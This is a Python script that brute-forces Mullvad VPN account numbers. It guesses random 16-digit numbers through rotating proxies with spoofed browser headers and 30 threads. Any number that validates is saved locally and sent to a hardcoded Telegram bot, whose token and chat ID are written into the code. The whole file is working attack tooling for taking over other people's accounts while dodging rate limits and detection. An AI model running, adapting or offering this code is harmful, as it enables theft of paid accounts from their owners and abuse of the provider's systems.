import threading
import requests
import time
from concurrent.futures import ThreadPoolExecutor
import random
import string
import sys

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
r = requests.session()

# Global variables
TELEGRAM_API_URL = "https://api.telegram.org/bot1865332133:AAEM0AM6MfxMt25_TAncwGACUaO53yyHS44/sendMessage"
PROXY_API_URL = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=1000&country=all&ssl=all&anonymity=all'
LINKED_ACCOUNTS_FILE = 'linked_accounts.txt'
LOCK = threading.Lock()
PROXIES = []
TOTAL_ACCOUNTS = 0
REGISTERED_ACCOUNTS = 0
BAD_ACCOUNTS  = 0
PROXY_ERRPR = 0
STOP_FLAG = False



def fetch_proxies():
    global PROXIES
    print('Getting proxies...')
    try:
        proxy = "5.161.219.116:8080"
        proxy_dict = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}",
        }
        response = r.get(PROXY_API_URL,proxies=proxy_dict, timeout=30,verify=False)
        if response.status_code == 200:
            proxy_list = response.text.strip().split('\n')
            print
            PROXIES = [{'http': f'http://{proxy.strip()}', 'https': f'http://{proxy.strip()}'} for proxy in proxy_list]
            print("Proxies updated")
        else:
            print("Failed to update proxies. Status code:", response.status_code)
    except Exception as e:
        print("Failed to fetch proxies:", e)
        return 'err'
        STOP_FLAG = True


def check_random_number():
    global PROXIES, TOTAL_ACCOUNTS, REGISTERED_ACCOUNTS,PROXY_ERRPR,BAD_ACCOUNTS
    while not STOP_FLAG:
        proxy = PROXIES.pop(0) if PROXIES else None
        if not proxy:
            print('Updating Proxy Please Wait')
            # Update proxies if the list is empty
            fetch_proxies()
            proxy = PROXIES.pop(0) if PROXIES else None

        try:
            random_number = ''.join(random.choices(string.digits, k=16))
            url = f'https://api.mullvad.net/www/accounts/{random_number}/'
            headers = {
                "scheme": "https",
                "accept": "application/json, text/plain, */*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9",
                "origin": "https://mullvad.net",
                "sec-ch-ua": '\"Chromium\";v=\"106\", \"Google Chrome\";v=\"106\", \"Not;A=Brand\";v=\"99\"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
            }
            response = r.get(url, proxies=proxy, headers=headers, timeout=10)
            TOTAL_ACCOUNTS += 1
            if "auth_token" in response.text:
                REGISTERED_ACCOUNTS += 1
                print(random_number)
                with LOCK:
                    with open(LINKED_ACCOUNTS_FILE, 'a') as file:
                        file.write(f"{random_number}\n")
                        r.post(f'https://api.telegram.org/bot1865332133:AAEM0AM6MfxMt25_TAncwGACUaO53yyHS44/sendMessage?chat_id=1141128758&text={random_number}',proxies=proxy)

            elif 'ACCOUNT_NOT_FOUND' in response.text :
                BAD_ACCOUNTS+=1

            elif '<title>503 Service Temporarily Unavailable</title>' in response.text :
                BAD_ACCOUNTS+=1

            elif 'THROTTLED' in response.text :
                BAD_ACCOUNTS+=1
                
            print(f"\rGood: {REGISTERED_ACCOUNTS} | Bad: {BAD_ACCOUNTS} PROXY: {PROXY_ERRPR} \r", end='')
            sys.stdout.flush()


        except requests.exceptions.RequestException as err:
            PROXY_ERRPR+=1
        except KeyboardInterrupt :
            print('closing')

        
        


def main():
    # Fetch initial proxies
    global STOP_FLAG
    msg = fetch_proxies()
    if msg == 'err' :
        return

    try:
        # Create thread pool
        with ThreadPoolExecutor(max_workers=30) as executor:
            while not STOP_FLAG:
                executor.submit(check_random_number)

    except KeyboardInterrupt:
        print("KeyboardInterrupt received. Stopping...")
        STOP_FLAG = True

    finally:
        print("Stopping...")
        STOP_FLAG = True


if __name__ == '__main__':
    main()
    print("Start")
